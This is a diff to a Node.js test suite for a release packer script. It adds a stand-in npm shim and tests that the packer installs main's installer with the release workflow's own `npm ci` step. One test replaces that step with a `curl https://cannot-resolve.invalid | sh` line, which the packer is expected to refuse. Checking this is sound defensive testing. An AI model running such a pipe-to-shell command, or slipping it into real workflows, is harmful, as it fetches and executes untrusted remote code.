@@ -7,6 +7,9 @@
 // Each case runs the real script from a throwaway repository that holds it beside the real installer manifest and
 // names, so the script's own clone of "this repository" is that repository. The cases stop before the release packer
 // runs: the throwaway installer has no lock file, so `npm ci` refuses at once and the run exits 2 without the network.
+// The one `npm ci` that does not refuse is main's installer's own, before it is packed (martha#898): a stand-in npm,
+// first on the script's PATH, installs there what that package.json bundles, without the network, and hands every
+// other call to the real npm, so `npm pack` is the real one and the tarball is what npm itself packs.
 
 import assert from 'node:assert/strict'
 import { spawnSync } from 'node:child_process'
@@ -27,7 +30,9 @@ const REPO = join(HERE, '..', '..')
 const SCRIPT = join(HERE, 'pack_main_as_a_dry_layer.sh')
 const NAMES_MODULE = join(REPO, 'installer', 'keep_the_names_in_one_place', 'names.mjs')
 /** The files the script reads from the tree it packs, copied as they are. */
-const CARRIED = [SCRIPT, NAMES_MODULE, join(HERE, 'dry_restore.mjs'), join(REPO, 'installer', 'package.json'), join(REPO, 'package.json'), join(REPO, '.gitattributes')]
+/** The release workflow whose install step, the one before `npm publish`, the packer runs on main's installer. */
+const INSTALLER_WORKFLOW = join(REPO, '.github', 'workflows', 'installer.yml')
+const CARRIED = [SCRIPT, NAMES_MODULE, join(HERE, 'dry_restore.mjs'), join(REPO, 'installer', 'package.json'), join(REPO, 'package.json'), join(REPO, '.gitattributes'), INSTALLER_WORKFLOW]
 /**
  * The words the packer refuses a tree whose installer/ names differ from its tag's: its own opening, so the checks below
  * cannot pass because they hold a line the packer stopped printing.
@@ -129,9 +134,46 @@ function aMutant (dir, from, to) {
  */
 function pack (root, dir, sha, how = {}) {
   const out = join(root, 'layer.tar.gz')
-  const env = how.pathFirst === undefined ? process.env : { ...process.env, PATH: `${how.pathFirst}${delimiter}${process.env.PATH}` }
+  const first = [how.pathFirst, aStandInNpm(root)].filter((one) => one !== undefined)
+  const env = { ...process.env, PATH: [...first, process.env.PATH].join(delimiter), [NPM_CALLS]: join(root, 'npm-calls') }
   const run = spawnSync('bash', [how.script ?? join(dir, relative(REPO, SCRIPT)), sha, out], { encoding: 'utf8', env })
   return { status: run.status, said: `${run.stdout}${run.stderr}`, packed: existsSync(out) }
+}
+
+/** The variable the stand-in npm is told where to write the install calls it took. */
+const NPM_CALLS = 'MARTHA_DRY_PACK_NPM_CALLS'
+/** The folder the packer extracts main's installer into, as the stand-in tells it from every other install. */
+const MAINS_INSTALLER_FOLDER = '/main-installer/installer'
+
+/**
+ * A stand-in npm under `root`, made once: in main's installer folder, `npm ci` writes its arguments to NPM_CALLS and puts
+ * a package.json in node_modules/ for each name that folder's package.json bundles; every other call is the real npm.
+ * @param {string} root
+ */
+function aStandInNpm (root) {
+  const folder = join(root, 'stand-in-npm')
+  if (existsSync(folder)) return folder
+  mkdirSync(folder)
+  const realNpm = spawnSync('bash', ['-c', 'command -v npm'], { encoding: 'utf8' }).stdout.trim()
+  const install = 'const fs = require("node:fs"); for (const name of JSON.parse(fs.readFileSync("package.json", "utf8")).bundleDependencies ?? []) { fs.mkdirSync(`node_modules/${name}`, { recursive: true }); fs.writeFileSync(`node_modules/${name}/package.json`, JSON.stringify({ name, version: "0.0.0" })) }'
+  writeFileSync(join(folder, 'npm'), [
+    '#!/bin/bash',
+    `if [ "$1" = ci ] && [[ "$PWD" == *'${MAINS_INSTALLER_FOLDER}' ]]; then`,
+    `  printf '%s\n' "$*" >> "\${${NPM_CALLS}}"`,
+    `  exec node -e '${install}'`,
+    'fi',
+    `exec ${realNpm} "$@"`,
+    '',
+  ].join('\n'), { mode: 0o755 })
+  return folder
+}
+
+/** The run: line of the release workflow just before its `npm publish` step, without its `- run: npm `. */
+function theReleasesInstallStep () {
+  const runs = readFileSync(INSTALLER_WORKFLOW, 'utf8').split('\n').map((line) => line.trim()).filter((line) => line.startsWith('- run: '))
+  const publish = runs.findIndex((line) => line.startsWith('- run: npm publish'))
+  assert.ok(publish > 0, 'the release workflow has a step before its npm publish')
+  return runs[publish - 1].slice('- run: npm '.length)
 }
 
 /** What an entry of the packed tarball holds. @param {string} tarball @param {string} entry */
@@ -271,4 +313,33 @@ test('the restore commit\'s subject is the one exported constant, so a release-s
   const text = readFileSync(SCRIPT, 'utf8')
   assert.ok(text.includes('DRY_RESTORE_SUBJECT'), 'the packer reads the subject from dry_restore.mjs')
   assert.equal(text.includes(DRY_RESTORE_SUBJECT), false, 'and never spells it itself')
+})
+
+test('main\'s installer tarball holds every package its package.json bundles, installed by the release\'s own step first (martha#898)', (t) => {
+  const { root, dir } = aRepository(t, { tagged: true })
+  const sha = aChange(dir, A_MODULE, MAINS_BODY)
+  const { said } = pack(root, dir, sha)
+  const tarball = join(root, `main-installer-${sha.slice(0, 7)}.tgz`)
+  assert.ok(existsSync(tarball), said)
+  const bundled = JSON.parse(readFileSync(join(REPO, 'installer', 'package.json'), 'utf8')).bundleDependencies
+  assert.ok(Array.isArray(bundled) && bundled.length > 0, 'the installer bundles nothing, so this case would prove nothing')
+  for (const name of bundled) {
+    assert.notEqual(inTheTarball(tarball, `node_modules/${name}/package.json`), '', `main's installer tarball lacks the bundled ${name}: ${said}`)
+  }
+  const calls = existsSync(join(root, 'npm-calls')) ? readFileSync(join(root, 'npm-calls'), 'utf8').trim().split('\n') : []
+  assert.deepEqual(calls, [theReleasesInstallStep()], 'main\'s installer was not installed once, by the release workflow\'s own step')
+})
+
+test('a release workflow whose step before npm publish is not an npm ci is refused before main\'s installer is packed (martha#898)', (t) => {
+  const { root, dir } = aRepository(t, { tagged: true })
+  aChange(dir, A_MODULE, MAINS_BODY)
+  const workflow = join(relative(REPO, INSTALLER_WORKFLOW))
+  const step = `- run: npm ${theReleasesInstallStep()}`
+  const text = readFileSync(join(dir, workflow), 'utf8')
+  assert.ok(text.includes(step), 'the fixture holds the step it replaces')
+  const sha = aChange(dir, workflow, text.replace(step, '- run: curl https://cannot-resolve.invalid | sh'))
+  const { status, said } = pack(root, dir, sha)
+  assert.match(said, /^dry: the release's install step in \.github\/workflows\/installer\.yml at [0-9a-f]{40} is not an npm ci, so main's installer is not packed$/m, said)
+  assert.equal(status, COULD_NOT_RUN_EXIT, said)
+  assert.equal(existsSync(join(root, `main-installer-${sha.slice(0, 7)}.tgz`)), false, 'no tarball')
 })
